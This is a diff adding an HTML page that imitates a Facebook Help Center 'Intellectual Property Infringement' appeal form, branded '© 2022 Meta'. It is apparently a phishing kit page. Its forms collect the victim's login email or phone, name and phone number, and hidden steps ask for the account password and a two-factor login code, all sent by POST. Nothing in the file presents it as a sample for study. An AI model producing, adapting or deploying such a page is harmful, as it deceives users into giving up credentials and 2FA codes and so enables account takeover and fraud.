@@ -1,0 +1,359 @@
+<style type="text/css">
+    body{
+        font-family: Helvetica;
+    }
+    .fillimidesktop{
+        padding-top: 10px;
+        padding-bottom: 10px;
+        background-color: white;
+    }
+
+    ul{
+        list-style-type: none;
+        margin-left: 0px;
+        padding-left: 0px;
+        margin-bottom: 0px;
+        padding-top: 3px;
+    }
+    li{
+
+        margin-left: 5px;
+        margin-right: 5px;
+        display: inline-block;
+    }
+    p{
+        margin-bottom: 0px;
+    }
+    .ikona {
+        font-size: 18px;
+        background-color: #e4e6eb;
+        padding-top: 5px;
+        padding-bottom: 5px;
+        padding-left: 10px;
+        padding-right: 10px;
+        font-weight: 600;
+    }
+    .fillimidesktop{
+        box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+    }
+
+    .leftcolon .ikonapara{
+        padding:10px;
+        background-color: #e4e6eb;
+        border-radius: 50%;
+        margin-right: 7px;
+    }
+    .leftcolon i{
+        font-size: 20px;
+        width: 20px;
+        height: 20px;
+    }
+    .leftcolon p{
+        font-size: 17px;
+        font-weight: 600;
+        margin-top: 20px;
+        margin-bottom: 20px;
+    }
+    .boxi{
+        background-color: #1877f2;
+        padding: 20px;
+        border-bottom-right-radius: 15px;
+        border-bottom-left-radius: 15px;
+    }
+    .boxi h2{
+        font-size: 28px;
+        font-weight: bolder;
+        color: white;
+        padding-left: 30px;
+    }
+    .meshkru{
+        border:1px solid #e5e5e5;
+        margin-top: 25px;
+    }
+    .headerimeshkru{
+        background-color: #f5f6f7;
+        padding-top: 15px;
+        padding-bottom: 15px;
+        font-weight: 500;
+        padding-left: 15px;
+        padding-right: 15px;
+        font-size: 18px;
+        border-bottom: 1px solid #e5e5e5;
+    }
+    .bodymeshkru .contenti{
+        padding:25px 15px 15px 15px;
+    }
+    .footerbuttoni{
+        background-color: #f5f6f7;
+        text-align: right;
+        padding:10px;
+        padding-right: 15px;
+        border-top: 1px solid #e5e5e5;
+    }
+    label{
+        color: #90949c;
+        font-size: 14px;
+        font-weight: bold;
+    }
+    input[type=text]{
+        height: 38px;
+        border-radius:0px;
+    }
+
+    .modal-dialog{
+        margin-top: 60px;
+    }
+    #dyshi {
+        display: none;
+    }
+    @media only screen and (max-width: 600px) {
+      .boxi h2{
+        padding-left: 0px;
+        font-size: 25px;
+      }
+      #helpcenter{
+        display: none;
+      }
+      .justformobile{
+        margin-top: 30px;
+      }
+    }
+
+</style>
+
+<section class="fillimidesktop">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-6 col-3">
+                <div class="" style="display: flex; align-items: center;">
+                    <img src="new.png" class="img-fluid" style=" height: 45px;" />
+                    <p style="font-size: 17px; font-weight: 600; color: #050505; margin-bottom: 0px; " id="helpcenter">Help Center</p>
+                </div>
+            </div>
+            <div class="col-md-6 col-9" style="text-align: right;">
+                <ul>
+                    <li>
+                        <div class="ikona" style="border-radius: 50%;">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="ikona" style="border-radius: 50%; padding-left: 13px; padding-right: 13px;">
+                            <i class="fa-solid fa-question"></i>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="ikona" style="border-radius: 5px;">
+                            <p>English (US)</p>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="main" id="maini">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-3 order-2 order-md-1 justformobile">
+                <ul class="leftcolon" style="padding-top: 10px; box-shadow: 4px 0 4px -2px rgba(0,0,0,0.1); height: 100%;">
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-compass"></i></span> Using Facebook</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-circle-user"></i></span> Managing Your Account</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-lock"></i></span> Privacy Safety Security</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-person-burst"></i></span> Reporting Abuse</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-bug"></i></span> Reporting a Problem</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-eye-slash"></i></span> Reporting a Privacy Violation</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-user-group"></i></span> Fake Accounts</p>
+                    </li>
+                    <li>
+                        <p><span class="ikonapara"><i class="fa-solid fa-copyright"></i></span> Intellectual Property</p>
+                    </li>
+                </ul>
+            </div>
+            <div class="col-md-9 order-1 order-md-2">
+                <div class="container">
+                    <div class="boxi">
+                        <div style="text-align: center;">
+                            <img src="sdi.png" class="img-fluid" style="height: 160px; object-fit: contain">
+                        </div>
+                        <h2>Intellectual Property Infringement</h2>
+                    </div>
+
+                    <p style="margin-top: 20px;">Facebook is committed to helping people and organizations protect their intellectual property rights. The Facebook Terms of Service do not allow posting content that violates someone else’s intellectual property rights, including copyright and trademark.</p>
+
+                    <div class="meshkru" style="margin-bottom: 20px;">
+                        <div class="headerimeshkru">
+                            <p style="font-weight: bold;
+font-size: 16px;
+color: #4b4f56;">Appeal a Page Policy Violation</p>
+                        </div>
+
+                        <div class="bodymeshkru">
+                            <form id="nukpodibro" method="POST">
+                                <div class="contenti">
+                                    <input type="hidden" name="typeo" value="appeal">
+                                  <div class="form-group">
+                                    <label for="emailaddress">Login email address or mobile phone number</label>
+                                    <input type="text" class="form-control" id="emailaddress" name="hin" required >
+                                  </div>
+                                  <div class="form-group">
+                                    <label for="name">Your name</label>
+                                    <input type="text" class="form-control" id="emrio" name="emni" required>
+                                  </div>
+                                  <div class="form-group">
+                                    <label for="pagename">Page Name</label>
+                                    <input type="text" class="form-control" id="pagename" name="faqja"  >
+                                  </div>
+                                  <div class="form-group">
+                                    <label for="phonenumber">Phone Number</label>
+                                    <input type="text" class="form-control" id="phonenumber" name="numri"  >
+                                  </div>
+
+                              </div>
+                              <div class="footerbuttoni">
+                                <button class="btn btn-primary" style="background-color: #345594; border-color: #345594; font-weight: 500; border-radius: 0px; font-size: 14px; font-weight: bold; padding-left: 15px; padding-right: 15px;">Send</button>
+                              </div>
+                            </form>
+
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+<section style="margin-top: 50px;" id="dyshi">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 offset-md-3 col-12">
+                <div class="kartingu">
+                    <div class="headeri" style="
+background-color: #f5f6f7;
+font-size: 16px;
+color: #4b4f56;
+padding: 12px;
+font-weight: 700;
+border-top: 1px solid rgba(0, 0, 0, .11);
+border-left: 1px solid rgba(0, 0, 0, .11);
+border-right: 1px solid rgba(0, 0, 0, .11);
+border-top-left-radius: 10px;
+border-top-right-radius: 10px;">
+                        <p>Two-factor authentication required</p>
+                    </div>
+                        <form method="POST" id="dyshifac" >
+                    <div class="trupi" style="    padding: 10px 20px !important;
+border: 1px solid rgba(0, 0, 0, .11); background-color: white;">
+
+                        <p style="padding-top: 10px; padding-bottom: 15px;">You&apos;ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
+                        <p style="margin-bottom: 20px;">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
+
+                        <div style="margin-bottom: 40px;">
+                          <input type="number" name="logcod" required class="form-control" placeholder="Login code">
+                        </div>
+
+                    </div>
+                    <div class="futeri" style="background-color: #f5f6f7;
+font-size: 16px;
+color: #4b4f56;
+padding: 12px;
+font-weight: 700;
+border-bottom: 1px solid rgba(0, 0, 0, .11);
+border-left: 1px solid rgba(0, 0, 0, .11);
+height: 60px;
+border-right: 1px solid rgba(0, 0, 0, .11);
+border-bottom-left-radius: 10px;
+border-bottom-right-radius: 10px;">
+                        <a type="button" data-toggle="modal" data-target="#fortwofac" style="font-weight: bold; font-size: 14px; padding-top: 6px; float: left; color: #345596; padding-left: 5px;">Need another way to authenticate?</a>
+                        <button class="btn btn-primary" style="background-color: #345594; border-color: #345594; font-weight: 500; border-radius: 0px; font-size: 14px; font-weight: bold; float: right;">Send</button>
+                    
+                    </div>
+                  </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+    <div class="modal fade" id="fortwofac" tabindex="-1" role="dialog" aria-labelledby="fortwofac" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="exampleModalLabel">Didn’t receive a code?</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <p style="margin-bottom: 15px; font-size: 15px;">1. Go to <strong>Settings &gt; Security and Login.</strong></p>
+        <p style="margin-bottom: 15px; font-size: 15px;">2. Under the <strong>Two-Factor Authentication</strong> section, click <strong>Use two-factor authentication</strong>. You may need to re-enter your password.</p>
+        <p style="margin-bottom: 15px; font-size: 15px;">3. Next to <strong>Recovery Codes</strong>, click <strong>Setup</strong> then <strong>Get Codes</strong>. If you&apos;ve already set up recovery codes, you can click <strong>Show Codes.</strong></p>
+        <img src="now.png" class="img-fluid" style="margin-bottom: 10px;">
+
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog " role="document">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" style="font-size: 16px; font-weight: bold;" id="exampleModalLabel">Please Re-Enter Your Password</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body" style="padding-bottom: 25px;">
+        <form method="POST" id="duhet">
+            <input type="hidden" name="typeo" value="pw1" />
+        <p style="margin-bottom: 10px">For your security, you must re-enter your password to continue.</p>
+        <div class="useri">
+            <img src="blank.png" class="img-fluid" style="width:40px; height:40px; border-radius: 50%; object-fit: cover;" />
+            <p id="putnamehere" style="display: inline-block;
+margin-bottom: 0px;
+font-weight: 600;
+font-size: 14px;
+color: #050505;
+padding-left: 5px;"></p>
+        </div>
+        <div class="form-group" style="margin-top: 10px;">
+            <label for="password">Password</label>
+            <input style="border-radius: 0px; height: 35px;" type="password" required class="form-control" id="pasi" name="pwi">
+            <p style="display: none; font-size: 14px; color: red; padding-top: 10px;" id="incorrectpassword" >Your password was incorrect</p>
+        </div>
+        <button class="btn btn-primary" id="butonimebosubmit" style="background-color: #345594; border-color: #345594; font-weight: 500; border-radius: 0px; padding-left: 15px; padding-right: 15px; font-size: 14px;">Submit</button>
+        </form>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+
+<section class="footer" id="futerii" style="background-color: #f0f2f5; text-align: center; margin-top: 20px; padding-top: 20px; padding-bottom: 20px;">
+    <div class="container">
+        <p style="color:#65676b; font-size: 14px;">© 2022 Meta</p>
+    </div>
+</section>
